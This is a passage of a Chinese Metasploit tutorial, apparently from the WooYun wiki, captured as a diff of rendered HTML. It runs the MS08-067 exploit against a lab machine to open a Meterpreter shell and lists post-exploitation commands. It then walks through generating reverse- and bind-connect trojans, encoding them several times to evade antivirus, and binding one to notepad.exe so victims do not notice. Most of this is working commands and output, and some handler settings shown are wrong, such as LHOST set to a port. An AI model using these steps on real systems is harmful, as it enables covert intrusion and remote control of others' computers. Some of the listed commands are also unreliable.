+   SMBPIPE  BROWSER          <span class="kw2">yes</span>       The pipe name to use <span class="br0">&#40;</span>BROWSER, SRVSVC<span class="br0">&#41;</span>
+&nbsp;
+&nbsp;
+Payload options <span class="br0">&#40;</span>windows<span class="sy0">/</span>meterpreter<span class="sy0">/</span>reverse_tcp<span class="br0">&#41;</span>:
+&nbsp;
+   Name      Current Setting  Required  Description
+   <span class="re5">----</span>      <span class="re5">---------------</span>  <span class="re5">--------</span>  <span class="re5">-----------</span>
+   EXITFUNC  thread           <span class="kw2">yes</span>       Exit technique <span class="br0">&#40;</span>accepted: seh, thread, process, none<span class="br0">&#41;</span>
+   LHOST     192.168.116.128  <span class="kw2">yes</span>       The listen address
+   LPORT     <span class="nu0">4444</span>             <span class="kw2">yes</span>       The listen port
+&nbsp;
+&nbsp;
+Exploit target:
+&nbsp;
+   Id  Name
+   <span class="re5">--</span>  <span class="re5">----</span>
+   <span class="nu0">17</span>  Windows XP SP2 Chinese - Simplified <span class="br0">&#40;</span>NX<span class="br0">&#41;</span></pre>
+
+<p>
+7、参数检查无误后，输入“exploit”对靶机进行攻击。当返回meterpreter提示符表示利用成功。
+</p>
+<pre class="code bash">msf exploit<span class="br0">&#40;</span>ms08_067_netapi<span class="br0">&#41;</span> <span class="sy0">&gt;</span> run
+&nbsp;
+<span class="br0">&#91;</span><span class="sy0">*</span><span class="br0">&#93;</span> Started reverse handler on 192.168.116.128:<span class="nu0">4444</span> 
+<span class="br0">&#91;</span><span class="sy0">*</span><span class="br0">&#93;</span> Attempting to trigger the vulnerability...
+<span class="br0">&#91;</span><span class="sy0">*</span><span class="br0">&#93;</span> Sending stage <span class="br0">&#40;</span><span class="nu0">769536</span> bytes<span class="br0">&#41;</span> to 192.168.116.129
+<span class="br0">&#91;</span><span class="sy0">*</span><span class="br0">&#93;</span> Meterpreter session <span class="nu0">1</span> opened <span class="br0">&#40;</span>192.168.116.128:<span class="nu0">4444</span> -<span class="sy0">&gt;</span> 192.168.116.129:<span class="nu0">1036</span><span class="br0">&#41;</span> at <span class="nu0">2015</span>-06-01 03:<span class="nu0">10</span>:<span class="nu0">26</span> <span class="re5">-0400</span></pre>
+
+<p>
+8、可以利用vnc对靶机进行图形化远程控制，命令：run vnc 。Meterpreter还有很多强大的功能，我们将在后续的章节详细介绍。
+</p>
+
+</div>
+
+<h3 class="sectionedit4" id="meterpreter">3、Meterpreter</h3>
+<div class="level3">
+<hr />
+
+</div>
+
+<h4 id="简介1">3.1 简介</h4>
+<div class="level4">
+
+<p>
+Metasploitv4之后的新版本中，Meterpreter作为后渗透攻击模块的实施通道，可以根据渗透测试目标需求进行灵活扩展。
+</p>
+
+<p>
+涉及范围：
+信息搜集、口令攫取、权限提升、内网拓展等。
+</p>
+
+</div>
+
+<h4 id="meterpreter技术优势">3.2 Meterpreter技术优势</h4>
+<div class="level4">
+
+<p>
+1、平台通用性
+提供了各种主流操作系统和平台上的meterpreter版本，包括windows、linux、BSD，并同时支持x86和x64平台。另外还提供基于java和php语言的实现，以应对各种不同环境。
+</p>
+
+<p>
+2、纯内存工作模式
+工作时直接装载meterpreter的动态链接库到目标进程空间，而不是先上传到磁盘，再调用loadlibrary加载动态链接库启动。这样启动隐蔽，很难被杀毒软件检测到，也不会再目标主机磁盘留下任何痕迹。
+</p>
+
+<p>
+3、灵活且加密的通信协议
+采用TLV（type length value）数据封装格式；通信数据经过XOR加密，然后调用OpenSSL库进行SSL封装传输，保证传输的保密和隐蔽性。
+</p>
+
+<p>
+4、易于扩展
+Meterpreter的插件以动态链接库文件的形式存在，可以选择你喜欢的编程语言按照Meterpreter的接口形式编写你需要的功能，然后编译成动态链接库，拷贝至相应目录即可。
+</p>
+
+</div>
+
+<h4 id="meterpreter常用命令">3.3 Meterpreter常用命令</h4>
+<div class="level4">
+
+<p>
+1、基本命令（包含meterpreter和msf终端、ruby接口、目标shell交互的命令）
+</p>
+<pre class="code">
+background（进程隐藏至后台）
+
+sessions（查看已经成功获取的会话，-i 恢复会话）
+
+quit（关闭当前会话）
+
+shell （获取系统控制台shell，如果目标系统命令行可执行程序不存在或禁止访问， 则shell命令会出错）
+
+irb（与Ruby终端交互，调用metasploit封装好的函数；在irb中还可以添加metasploit附加组件railgun，直接与windows本地API进行交互）
+</pre>
+
+<p>
+2、文件系统命令（与目标文件系统交互，包括查看、上传下载、搜索、编辑）
+</p>
+<pre class="code">cat（目标系统文件交互）
+
+getwd（获取目标机当前工作目录,getlwd本地当前工作工作目录）
+
+upload（上传文件或文件夹到目标机 -r 递归）
+
+download（从目标机下载文件或文件夹 -r 递归）
+
+edit（调用vi编辑器，对目标上的文件进行编辑）
+
+search（对目标机的文件进行搜索）</pre>
+
+<p>
+3、网络命令（查看目标网络状况、连接信息，进行端口转发等）
+</p>
+<pre class="code">ipconfig（获取目标主机上的网络接口信息）
+
+portfwd（端口转发：将目标主机开放但不允许访问的端口进行转发）
+
+route（显示目标主机路由信息）</pre>
+
+<p>
+4、系统命令（查看目标系统信息、对系统进行基本操作等）
+</p>
+<pre class="code">ps（查看目标机正在运行的进程信息）
+
+migrate（将meterpreter会话进程迁移到另一个进程内存空间）
+
+execute（在目标机上执行文件）
+
+getpid（当前会话所在进程的pid值）
+
+kill（终结指定的pid程序）
+
+getuid（获取当前会话用户名）
+
+sysinfo（获取系统信息）
+
+shutdown（关闭目标主机）</pre>
+
+<p>
+5、用户接口命令
+</p>
+<pre class="code">screenshot（截获被控主机当前桌面）</pre>
+
+</div>
+
+<h4 id="后渗透模块">3.4 后渗透模块</h4>
+<div class="level4">
+
+<p>
+MetasploitV4.0正式引入后渗透模块，其格式与渗透攻击模块相统一，位于post/ 目录下，用于实现特殊或定制的功能。
+</p>
+
+<p>
+Meterpreter在渗透测试中的范围：
+</p>
+
+<p>
+范围包括：权限提升、信息窃取、口令攫取和利用、内网拓展、掩踪灭迹、维持访问。
+</p>
+
+</div>
+
+<h3 class="sectionedit5" id="攻击载荷_msfpayload">4、攻击载荷（Msfpayload）</h3>
+<div class="level3">
+<hr />
+
+</div>
+
+<h4 id="简介2">4.1 简介</h4>
+<div class="level4">
+
+<p>
+攻击载荷（msfpayload）是我们期望目标系统在被渗透攻击后去执行的代码，在metasploit框架中可以自由的选择、传送和植入。
+</p>
+
+<p>
+使用命令“msfpayload -l”可以查看攻击载荷列表：
+</p>
+<pre class="code bash"><span class="co4">light@kali:~# </span>msfpayload <span class="re5">-l</span>
+&nbsp;
+Framework Payloads <span class="br0">&#40;</span><span class="nu0">340</span> total<span class="br0">&#41;</span>
+==============================
+&nbsp;
+    Name                                             Description
+    <span class="re5">----</span>                                             <span class="re5">-----------</span>
+    aix<span class="sy0">/</span>ppc<span class="sy0">/</span>shell_bind_tcp                           Listen <span class="kw1">for</span> a connection and spawn a <span class="kw3">command</span> shell
+    aix<span class="sy0">/</span>ppc<span class="sy0">/</span>shell_find_port                          Spawn a shell on an established connection
+    aix<span class="sy0">/</span>ppc<span class="sy0">/</span>shell_interact                           Simply execve <span class="sy0">/</span>bin<span class="sy0">/</span><span class="kw2">sh</span> <span class="br0">&#40;</span><span class="kw1">for</span> inetd programs<span class="br0">&#41;</span>
+    aix<span class="sy0">/</span>ppc<span class="sy0">/</span>shell_reverse_tcp                        Connect back to attacker and spawn a <span class="kw3">command</span> shell
+    android<span class="sy0">/</span>meterpreter<span class="sy0">/</span>reverse_http                 Run a meterpreter server on Android. Tunnel communication over HTTP
+    android<span class="sy0">/</span>meterpreter<span class="sy0">/</span>reverse_https                Run a meterpreter server on Android. Tunnel communication over HTTPS
+    android<span class="sy0">/</span>meterpreter<span class="sy0">/</span>reverse_tcp                  Run a meterpreter server on Android. Connect back stager
+    android<span class="sy0">/</span>shell<span class="sy0">/</span>reverse_http                       Spawn a piped <span class="kw3">command</span> shell <span class="br0">&#40;</span><span class="kw2">sh</span><span class="br0">&#41;</span>. Tunnel communication over HTTP
+    android<span class="sy0">/</span>shell<span class="sy0">/</span>reverse_https                      Spawn a piped <span class="kw3">command</span> shell <span class="br0">&#40;</span><span class="kw2">sh</span><span class="br0">&#41;</span>. Tunnel communication over HTTPS
+    android<span class="sy0">/</span>shell<span class="sy0">/</span>reverse_tcp                        Spawn a piped <span class="kw3">command</span> shell <span class="br0">&#40;</span><span class="kw2">sh</span><span class="br0">&#41;</span>. Connect back stager
+    bsd<span class="sy0">/</span>sparc<span class="sy0">/</span>shell_bind_tcp                         Listen <span class="kw1">for</span> a connection and spawn a <span class="kw3">command</span> shell
+    bsd<span class="sy0">/</span>sparc<span class="sy0">/</span>shell_reverse_tcp                      Connect back to attacker and spawn a <span class="kw3">command</span> shell
+    bsd<span class="sy0">/</span>x86<span class="sy0">/</span><span class="kw3">exec</span>                                     Execute an arbitrary <span class="kw3">command</span>
+    bsd<span class="sy0">/</span>x86<span class="sy0">/</span>metsvc_bind_tcp                          Stub payload <span class="kw1">for</span> interacting with a Meterpreter Service
+    bsd<span class="sy0">/</span>x86<span class="sy0">/</span>metsvc_reverse_tcp                       Stub payload <span class="kw1">for</span> interacting with a Meterpreter Service
+    bsd<span class="sy0">/</span>x86<span class="sy0">/</span>shell<span class="sy0">/</span>bind_ipv6_tcp                      Spawn a <span class="kw3">command</span> shell <span class="br0">&#40;</span>staged<span class="br0">&#41;</span>. Listen <span class="kw1">for</span> a connection over IPv6
+    bsd<span class="sy0">/</span>x86<span class="sy0">/</span>shell<span class="sy0">/</span>bind_tcp                           Spawn a <span class="kw3">command</span> shell <span class="br0">&#40;</span>staged<span class="br0">&#41;</span>. Listen <span class="kw1">for</span> a connection
+    bsd<span class="sy0">/</span>x86<span class="sy0">/</span>shell<span class="sy0">/</span>find_tag                           Spawn a <span class="kw3">command</span> shell <span class="br0">&#40;</span>staged<span class="br0">&#41;</span>. Use an established connection
+    bsd<span class="sy0">/</span>x86<span class="sy0">/</span>shell<span class="sy0">/</span>reverse_ipv6_tcp                   Spawn a <span class="kw3">command</span> shell <span class="br0">&#40;</span>staged<span class="br0">&#41;</span>. Connect back to the attacker over IPv6
+    bsd<span class="sy0">/</span>x86<span class="sy0">/</span>shell<span class="sy0">/</span>reverse_tcp                        Spawn a <span class="kw3">command</span> shell <span class="br0">&#40;</span>staged<span class="br0">&#41;</span>. Connect back to the attacker
+    bsd<span class="sy0">/</span>x86<span class="sy0">/</span>shell_bind_tcp                           Listen <span class="kw1">for</span> a connection and spawn a <span class="kw3">command</span> shell
+    bsd<span class="sy0">/</span>x86<span class="sy0">/</span>shell_bind_tcp_ipv6                      Listen <span class="kw1">for</span> a connection and spawn a <span class="kw3">command</span> shell over IPv6
+    bsd<span class="sy0">/</span>x86<span class="sy0">/</span>shell_find_port                          Spawn a shell on an established connection
+    bsd<span class="sy0">/</span>x86<span class="sy0">/</span>shell_find_tag                           Spawn a shell on an established connection <span class="br0">&#40;</span>proxy<span class="sy0">/</span>nat safe<span class="br0">&#41;</span>
+    bsd<span class="sy0">/</span>x86<span class="sy0">/</span>shell_reverse_tcp                        Connect back to attacker and spawn a <span class="kw3">command</span> shell
+    bsd<span class="sy0">/</span>x86<span class="sy0">/</span>shell_reverse_tcp_ipv6                   Connect back to attacker and spawn a <span class="kw3">command</span> shell over IPv6
+    ....
+&nbsp;</pre>
+
+</div>
+
+<h4 id="利用msfpayload生成meterpreter反弹木马实验">4.2 利用msfpayload生成meterpreter反弹木马实验</h4>
+<div class="level4">
+
+<p>
+1、下面我们利用msfpayload生成一个windows下运行的反弹meterpreter木马，命令为:
+</p>
+<pre class="code bash">msfpayload windows<span class="sy0">/</span>meterpreter<span class="sy0">/</span>reverse_tcp <span class="re2">LHOST</span>=192.168.116.128 <span class="re2">LPORT</span>=<span class="nu0">10086</span> X <span class="sy0">&gt;</span> Desktop<span class="sy0">/</span>muma01.exe</pre>
+<pre class="code bash"><span class="co4">light@kali:~# </span>msfpayload windows<span class="sy0">/</span>meterpreter<span class="sy0">/</span>reverse_tcp <span class="re2">LHOST</span>=192.168.116.128 <span class="re2">LPORT</span>=<span class="nu0">10086</span> X <span class="sy0">&gt;</span> Desktop<span class="sy0">/</span>muma01.exe
+Created by msfpayload <span class="br0">&#40;</span>http:<span class="sy0">//</span>www.metasploit.com<span class="br0">&#41;</span>.
+Payload: windows<span class="sy0">/</span>meterpreter<span class="sy0">/</span>reverse_tcp
+ Length: <span class="nu0">287</span>
+Options: <span class="br0">&#123;</span><span class="st0">&quot;LHOST&quot;</span>=<span class="sy0">&gt;</span><span class="st0">&quot;192.168.116.128&quot;</span>, <span class="st0">&quot;LPORT&quot;</span>=<span class="sy0">&gt;</span><span class="st0">&quot;10086&quot;</span><span class="br0">&#125;</span></pre>
+
+<p>
+参数解释：msfpayload后面跟生成木马所选用的攻击载荷，后面在加上攻击载荷所需要的参数（上例中需要设置的是本地系统的IP与端口），“X”表示生成可执行文件，“&gt;”号后面跟自定义的生成文件的路径与文件名。
+</p>
+
+<p>
+2、可以检查一下文件属性，看到是有效的windows可执行程序：
+</p>
+<pre class="code bash"><span class="co4">light@kali:~# </span><span class="kw2">file</span> Desktop<span class="sy0">/</span>muma01.exe 
+Desktop<span class="sy0">/</span>muma01.exe: PE32 executable <span class="br0">&#40;</span>GUI<span class="br0">&#41;</span> Intel <span class="nu0">80386</span>, <span class="kw1">for</span> MS Windows</pre>
+
+<p>
+3、在本地渗透测试系统中进入msfconsole并开启监听：
+</p>
+<pre class="code bash">use exploit<span class="sy0">/</span>multi<span class="sy0">/</span>handler</pre>
+
+<p>
+，然后指定要监听的的攻击载荷类型：
+</p>
+<pre class="code bash"><span class="kw1">set</span> PAYLOAD windows<span class="sy0">/</span>meterpreter<span class="sy0">/</span>reverse_tcp</pre>
+
+<p>
+，最后设置好对应的参数，开启监听。
+</p>
+<pre class="code bash">msf <span class="sy0">&gt;</span> use exploit<span class="sy0">/</span>multi<span class="sy0">/</span>handler 
+msf exploit<span class="br0">&#40;</span>handler<span class="br0">&#41;</span> <span class="sy0">&gt;</span> <span class="kw1">set</span> PAYLOAD windows<span class="sy0">/</span>meterpreter<span class="sy0">/</span>reverse_tcp
+PAYLOAD =<span class="sy0">&gt;</span> windows<span class="sy0">/</span>meterpreter<span class="sy0">/</span>reverse_tcp
+msf exploit<span class="br0">&#40;</span>handler<span class="br0">&#41;</span> <span class="sy0">&gt;</span> <span class="kw1">set</span> LHOST 192.168.116.128
+LHOST =<span class="sy0">&gt;</span> 192.168.116.128
+msf exploit<span class="br0">&#40;</span>handler<span class="br0">&#41;</span> <span class="sy0">&gt;</span> <span class="kw1">set</span> LHOST <span class="nu0">10086</span>
+LHOST =<span class="sy0">&gt;</span> <span class="nu0">10086</span>
+msf exploit<span class="br0">&#40;</span>handler<span class="br0">&#41;</span> <span class="sy0">&gt;</span> exploit 
+&nbsp;
+<span class="br0">&#91;</span><span class="sy0">*</span><span class="br0">&#93;</span> Started reverse handler on 192.168.116.128:<span class="nu0">10086</span>
+<span class="br0">&#91;</span><span class="sy0">*</span><span class="br0">&#93;</span> Starting the payload handler...</pre>
+
+<p>
+4、在我们的windows靶机下打开刚才由msfpayload生成的木马文件。
+</p>
+
+<p>
+5、在渗透测试系统的msfconsole中看到反弹马已经成功返回meterpreter，实验成功！
+</p>
+<pre class="code bash">msf exploit<span class="br0">&#40;</span>handler<span class="br0">&#41;</span> <span class="sy0">&gt;</span> exploit
+&nbsp;
+<span class="br0">&#91;</span><span class="sy0">*</span><span class="br0">&#93;</span> Started reverse handler on 192.168.116.128:<span class="nu0">10086</span> 
+<span class="br0">&#91;</span><span class="sy0">*</span><span class="br0">&#93;</span> Starting the payload handler...
+<span class="br0">&#91;</span><span class="sy0">*</span><span class="br0">&#93;</span> Sending stage <span class="br0">&#40;</span><span class="nu0">769536</span> bytes<span class="br0">&#41;</span> to 192.168.116.129
+<span class="br0">&#91;</span><span class="sy0">*</span><span class="br0">&#93;</span> Meterpreter session <span class="nu0">1</span> opened <span class="br0">&#40;</span>192.168.116.128:<span class="nu0">10086</span> -<span class="sy0">&gt;</span> 192.168.116.129:<span class="nu0">1036</span><span class="br0">&#41;</span> at <span class="nu0">2015</span>-06-01 03:<span class="nu0">10</span>:<span class="nu0">26</span> <span class="re5">-0400</span>
+&nbsp;
+meterpreter <span class="sy0">&gt;</span></pre>
+
+</div>
+
+<h4 id="直连型木马_bind_tcp_生成实验">4.3 直连型木马（bind_tcp）生成实验</h4>
+<div class="level4">
+
+<p>
+实验之前我们先用一张图简单展示一下反弹型与直连型木马的区别。
+</p>
+
+<p>
+<a href="http://wiki.wooyun.org/_detail/tools:p15_1_.png?id=tools%3Ametasploit" class="media" title="tools:p15_1_.png"><img src="http://wiki.wooyun.org/_media/tools:p15_1_.png" class="media" title="请输入图片描述" alt="请输入图片描述" /></a>
+</p>
+
+<p>
+1、使用msfpayload生成一个windows下运行的直连型meterpreter木马，命令：
+</p>
+<pre class="code bash">msfpayload windows<span class="sy0">/</span>meterpreter<span class="sy0">/</span>bind_tcp <span class="re2">RHOST</span>=192.168.198.224 <span class="re2">LPORT</span>=<span class="nu0">10086</span> X <span class="sy0">&gt;</span> Desktop<span class="sy0">/</span>muma02.exe</pre>
+
+<p>
+因为是直连，所以参数里的IP是靶机IP（RHOST），这里要注意区分。
+</p>
+<pre class="code bash"><span class="co4">light@kali:~# </span>msfpayload windows<span class="sy0">/</span>meterpreter<span class="sy0">/</span>bind_tcp <span class="re2">RHOST</span>=192.168.198.224 <span class="re2">LPORT</span>=<span class="nu0">10086</span> X <span class="sy0">&gt;</span> Desktop<span class="sy0">/</span>muma02.exe
+Created by msfpayload <span class="br0">&#40;</span>http:<span class="sy0">//</span>www.metasploit.com<span class="br0">&#41;</span>.
+Payload: windows<span class="sy0">/</span>meterpreter<span class="sy0">/</span>bind_tcp
+ Length: <span class="nu0">295</span>
+Options: <span class="br0">&#123;</span><span class="st0">&quot;RHOST&quot;</span>=<span class="sy0">&gt;</span><span class="st0">&quot;192.168.198.224&quot;</span>, <span class="st0">&quot;LPORT&quot;</span>=<span class="sy0">&gt;</span><span class="st0">&quot;10086&quot;</span><span class="br0">&#125;</span></pre>
+
+<p>
+2、设置监听（注意参数）
+</p>
+<pre class="code bash">msf <span class="sy0">&gt;</span> use exploit<span class="sy0">/</span>multi<span class="sy0">/</span>handler 
+msf exploit<span class="br0">&#40;</span>handler<span class="br0">&#41;</span> <span class="sy0">&gt;</span> <span class="kw1">set</span> PAYLOAD windows<span class="sy0">/</span>meterpreter<span class="sy0">/</span>bind_tcp
+PAYLOAD =<span class="sy0">&gt;</span> windows<span class="sy0">/</span>meterpreter<span class="sy0">/</span>reverse_tcp
+msf exploit<span class="br0">&#40;</span>handler<span class="br0">&#41;</span> <span class="sy0">&gt;</span> <span class="kw1">set</span> LHOST 192.168.116.128
+LHOST =<span class="sy0">&gt;</span> 192.168.116.128
+msf exploit<span class="br0">&#40;</span>handler<span class="br0">&#41;</span> <span class="sy0">&gt;</span> <span class="kw1">set</span> LHOST <span class="nu0">10086</span>
+LHOST =<span class="sy0">&gt;</span> <span class="nu0">10086</span>
+msf exploit<span class="br0">&#40;</span>handler<span class="br0">&#41;</span> <span class="sy0">&gt;</span> exploit 
+&nbsp;
+<span class="br0">&#91;</span><span class="sy0">*</span><span class="br0">&#93;</span> Starting the payload handler...
+<span class="br0">&#91;</span><span class="sy0">*</span><span class="br0">&#93;</span> Started <span class="kw3">bind</span> handler</pre>
+
+<p>
+3、靶机运行木马后，攻击端成功连接。
+</p>
+<pre class="code bash"><span class="br0">&#91;</span><span class="sy0">*</span><span class="br0">&#93;</span> Starting the payload handler...
+<span class="br0">&#91;</span><span class="sy0">*</span><span class="br0">&#93;</span> Started <span class="kw3">bind</span> handler 
+<span class="br0">&#91;</span><span class="sy0">*</span><span class="br0">&#93;</span> Sending stage <span class="br0">&#40;</span><span class="nu0">769536</span> bytes<span class="br0">&#41;</span> to 192.168.116.129
+<span class="br0">&#91;</span><span class="sy0">*</span><span class="br0">&#93;</span> Meterpreter session <span class="nu0">1</span> opened <span class="br0">&#40;</span>192.168.116.128:<span class="nu0">10086</span> -<span class="sy0">&gt;</span> 192.168.116.129:<span class="nu0">1036</span><span class="br0">&#41;</span> at <span class="nu0">2015</span>-06-01 03:<span class="nu0">10</span>:<span class="nu0">26</span> <span class="re5">-0400</span>
+&nbsp;
+meterpreter <span class="sy0">&gt;</span></pre>
+
+</div>
+
+<h3 class="sectionedit6" id="msf编码_msfencode">5、MSF编码（Msfencode）</h3>
+<div class="level3">
+<hr />
+
+</div>
+
+<h4 id="简介3">5.1 简介</h4>
+<div class="level4">
+
+<p>
+Msf编码器是一个非常实用的工具，它能够改变可执行文件中的代码形状，让杀毒软件认不出它原来的样子，而程序的功能不会受到任何影响。和电子邮件附件使用Base64重新编码类似，msf编码器将原始的可执行程序重新编码，并生成一个新的二进制文件。当这个文件运行后，msf编码器会将原始程序解码到内存中并执行。
+</p>
+
+<p>
+使用命令“msfencode -h”可以查看msfencode参数说明，“msfencode -l”可以查看msf编码器列表。
+</p>
+<pre class="code bash"><span class="co4">light@kali:~# </span>msfencode <span class="re5">-l</span>
+&nbsp;
+Framework Encoders
+==================
+&nbsp;
+    Name                          Rank       Description
+    <span class="re5">----</span>                          <span class="re5">----</span>       <span class="re5">-----------</span>
+    cmd<span class="sy0">/</span>generic_sh                good       Generic Shell Variable Substitution Command Encoder
+    cmd<span class="sy0">/</span>ifs                       low        Generic <span class="co1">${IFS}</span> Substitution Command Encoder
+    cmd<span class="sy0">/</span>powershell_base64         excellent  Powershell Base64 Command Encoder
+    cmd<span class="sy0">/</span>printf_php_mq             manual     <span class="kw3">printf</span><span class="br0">&#40;</span><span class="nu0">1</span><span class="br0">&#41;</span> via PHP magic_quotes Utility Command Encoder
+    generic<span class="sy0">/</span>eicar                 manual     The EICAR Encoder
+    generic<span class="sy0">/</span>none                  normal     The <span class="st0">&quot;none&quot;</span> Encoder
+    mipsbe<span class="sy0">/</span>byte_xori              normal     Byte XORi Encoder
+    mipsbe<span class="sy0">/</span>longxor                normal     XOR Encoder
+    mipsle<span class="sy0">/</span>byte_xori              normal     Byte XORi Encoder
+    mipsle<span class="sy0">/</span>longxor                normal     XOR Encoder
+    php<span class="sy0">/</span>base64                    great      PHP Base64 Encoder
+    ppc<span class="sy0">/</span>longxor                   normal     PPC LongXOR Encoder
+    ppc<span class="sy0">/</span>longxor_tag               normal     PPC LongXOR Encoder
+    sparc<span class="sy0">/</span>longxor_tag             normal     SPARC DWORD XOR Encoder
+    x64<span class="sy0">/</span>xor                       normal     XOR Encoder
+    x86<span class="sy0">/</span>add_sub                   manual     Add<span class="sy0">/</span>Sub Encoder
+    x86<span class="sy0">/</span>alpha_mixed               low        Alpha2 Alphanumeric Mixedcase Encoder
+    x86<span class="sy0">/</span>alpha_upper               low        Alpha2 Alphanumeric Uppercase Encoder
+    x86<span class="sy0">/</span>avoid_underscore_tolower  manual     Avoid underscore<span class="sy0">/</span>tolower
+    x86<span class="sy0">/</span>avoid_utf8_tolower        manual     Avoid UTF8<span class="sy0">/</span>tolower
+    x86<span class="sy0">/</span>bloxor                    manual     BloXor - A Metamorphic Block Based XOR Encoder
+    x86<span class="sy0">/</span>call4_dword_xor           normal     Call+<span class="nu0">4</span> Dword XOR Encoder
+    x86<span class="sy0">/</span>context_cpuid             manual     CPUID-based Context Keyed Payload Encoder
+    x86<span class="sy0">/</span>context_stat              manual     <span class="kw2">stat</span><span class="br0">&#40;</span><span class="nu0">2</span><span class="br0">&#41;</span>-based Context Keyed Payload Encoder
+    x86<span class="sy0">/</span>context_time              manual     <span class="kw1">time</span><span class="br0">&#40;</span><span class="nu0">2</span><span class="br0">&#41;</span>-based Context Keyed Payload Encoder
+    x86<span class="sy0">/</span>countdown                 normal     Single-byte XOR Countdown Encoder
+    x86<span class="sy0">/</span>fnstenv_mov               normal     Variable-length Fnstenv<span class="sy0">/</span>mov Dword XOR Encoder
+    x86<span class="sy0">/</span>jmp_call_additive         normal     Jump<span class="sy0">/</span>Call XOR Additive Feedback Encoder
+    x86<span class="sy0">/</span>nonalpha                  low        Non-Alpha Encoder
+    x86<span class="sy0">/</span>nonupper                  low        Non-Upper Encoder
+    x86<span class="sy0">/</span>opt_sub                   manual     Sub Encoder <span class="br0">&#40;</span>optimised<span class="br0">&#41;</span>
+    x86<span class="sy0">/</span>shikata_ga_nai            excellent  Polymorphic XOR Additive Feedback Encoder
+    x86<span class="sy0">/</span>single_static_bit         manual     Single Static Bit
+    x86<span class="sy0">/</span>unicode_mixed             manual     Alpha2 Alphanumeric Unicode Mixedcase Encoder
+    x86<span class="sy0">/</span>unicode_upper             manual     Alpha2 Alphanumeric Unicode Uppercase Encoder</pre>
+
+</div>
+
+<h4 id="msfencode编码实验">5.2 MSFENCODE编码实验</h4>
+<div class="level4">
+
+<p>
+1、生成一个经过msfencode编码的木马文件：
+</p>
+<pre class="code bash">msfpayload windows<span class="sy0">/</span>meterpreter<span class="sy0">/</span>reverse_tcp <span class="re2">LHOST</span>=192.168.198.220 <span class="re2">LPORT</span>=<span class="nu0">10086</span> R <span class="sy0">|</span> msfencode <span class="re5">-e</span> x86<span class="sy0">/</span>shikata_ga_nai <span class="re5">-t</span> exe <span class="sy0">&gt;</span> Desktop<span class="sy0">/</span>muma_encode.exe</pre>
+
+<p>
+参数解释
+“R”：输出原始数据
+“|” ： 分割符
+“-e”：指定编码器类型
+“-t”：输出文件类型
+“&gt;”：指定生成文件名（可以用“-o”参数替代）
+</p>
+
+<p>
+2、多重编码
+单纯的一次msfencode编码现在已经很难绕过杀软，在掌握了上面基本的编码技巧后，我们学习一下msfencode的多重编码。
+在Metasploit框架中，允许我们使用多重编码技术来对攻击载荷（msfpayload）进行多次编码，以绕过杀软的特征码检查。
+生成一个经过多次msfencode编码的木马文件：
+</p>
+<pre class="code bash">msfpayload windows<span class="sy0">/</span>meterpreter<span class="sy0">/</span>reverse_tcp <span class="re2">LHOST</span>=192.168.198.220 <span class="re2">LPORT</span>=<span class="nu0">10086</span> R <span class="sy0">|</span> msfencode <span class="re5">-e</span> x86<span class="sy0">/</span>shikata_ga_nai <span class="re5">-c</span> <span class="nu0">5</span> <span class="re5">-t</span> raw <span class="sy0">|</span> msfencode <span class="re5">-e</span> x86<span class="sy0">/</span>jmp_call_additive <span class="re5">-c</span> <span class="nu0">3</span> <span class="re5">-t</span> raw <span class="sy0">|</span> msfencode <span class="re5">-e</span> x86<span class="sy0">/</span>call4_dword_xor <span class="re5">-c</span> <span class="nu0">7</span> <span class="re5">-t</span> raw <span class="sy0">|</span> msfencode <span class="re5">-e</span> x86<span class="sy0">/</span>shikata_ga_nai <span class="re5">-c</span> <span class="nu0">2</span> <span class="re5">-t</span> exe <span class="re5">-o</span> Desktop<span class="sy0">/</span>muma_multiEncode.exe</pre>
+
+<p>
+参数解释
+“-c”：使用当前编码器编码的次数
+“raw”：以原始数据类型输出
+“-o”：指定生成的文件名
+</p>
+
+<p>
+注意：过多次的使用msfencode混合编码虽然绕过杀软检测的效果更好，但同时也有导致木马文件无法正常运行的可能。所以建议在编码后先对所生成文件的可用性进行检查。
+请输入图片描述
+</p>
+
+<p>
+3、伪装你的木马文件
+大多数情况下，当被攻击的用户运行类似我们上面生成的包含后门的可执行文件时，因为什么都没有发生，这很可能会引起用户的怀疑。为了避免被目标察觉，我们可以在启动攻击载荷的同时，捆绑一个宿主程序，让木马达到伪装的效果。
+这里使用windows下著名的文本编辑器notepad.exe（32位）程序作宿主程序来进行演示，notepad.exe文件可以在网上下载或者直接从windows系统的c:\windows\system32路径下拷贝出来。
+</p>
+
+<p>
+以下生成的木马文件在受攻击端打开时会启动正常的notepad文本编辑器，同时后门程序会在另一个独立进程中执行，连回攻击端。并且具备一定的免杀能力。
+</p>
+<pre class="code bash">msfpayload windows<span class="sy0">/</span>meterpreter<span class="sy0">/</span>reverse_tcp <span class="re2">LHOST</span>=192.168.116.128 <span class="re2">LPORT</span>=<span class="nu0">10086</span> R <span class="sy0">|</span> msfencode <span class="re5">-e</span> x86<span class="sy0">/</span>shikata_ga_nai <span class="re5">-c</span> <span class="nu0">5</span> <span class="re5">-x</span> Desktop<span class="sy0">/</span>notepad.exe <span class="re5">-k</span> <span class="re5">-t</span> exe <span class="re5">-o</span> Desktop<span class="sy0">/</span>muma_notepad.exe</pre>
+
+<p>
+请输入图片描述
+捆绑宿主程序
+</p>
+
+<p>
+请输入图片描述
+运行时启动宿主程序，起到伪装效果
+</p>
+
+<p>
+请输入图片描述
+生成的文件具备一定免杀能力
+</p>
+
+<p>
+参数解释
+“-x”： 绑定木马到制定程序
+“-k”： 配置攻击载荷在独立的线程中启动
+</p>
+
+<p>
+注意
+“-k”参数会配置攻击载荷在一个独立的线程中启动，这样宿主程序在执行时不会受到影响，但此参数不一定能用在所有可执行程序上，实际攻击前请确保你已经在实验环境中进行了测试。
+</p>
+
+</div>
+
+<h3 class="sectionedit7" id="辅助模块_auxiliary">6、辅助模块（Auxiliary）</h3>
+<div class="level3">
+<hr />
+
+</div>
+
+<h4 id="简介4">6.1 简介</h4>
+<div class="level4">
+
+<p>
+Metasploit的辅助模块主要用于信息搜集阶段，功能包括扫描、口令猜解、敏感信息嗅探、FUZZ测试发掘漏洞、实施网络协议欺骗等。这些模块可以分为Admin、Scanner、Server三个大类。
+</p>
+
+<p>
+Admin
+Admin HTTP Modules
+Admin MSSQL Modules
+Admin MySQL Modules
+Admin Postgres Modules
+Admin VMWare Modules
+</p>
+
+<p>
+Scanner
+DCERPC
+Discovery
+<abbr title="File Transfer Protocol">FTP</abbr>
+HTTP
+IMAP
+MSSQL
+MySQL
+NetBIOS
+POP3
+SMB
+SMTP
+SNMP
+SSH
+Telnet
+TFTP
+VMWare
+VNC
